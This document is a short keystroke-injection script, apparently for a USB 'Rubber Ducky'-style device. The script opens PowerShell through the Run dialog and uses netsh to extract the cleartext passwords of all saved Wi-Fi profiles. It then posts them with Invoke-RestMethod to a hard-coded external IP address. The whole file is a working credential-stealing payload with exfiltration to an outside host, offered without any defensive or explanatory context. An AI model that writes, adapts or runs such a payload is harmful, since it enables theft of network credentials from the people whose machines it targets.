REM Open PowerShell and execute the command to show saved Wi-Fi passwords
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500
STRING $wifiPasswords = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {($_.ToString().Split(":")[1]).Trim()} | ForEach-Object {netsh wlan show profile name="$_" key=clear} | Select-String "Key Content" | ForEach-Object {($_.ToString().Split(":")[1]).Trim()} | Out-String; Write-Host "Wi-Fi Passwords: $wifiPasswords"; Invoke-RestMethod -Uri "http://172.105.84.240/receive" -Method Post -Body @{wifiPasswords=$wifiPasswords} -ContentType "application/x-www-form-urlencoded"
ENTER
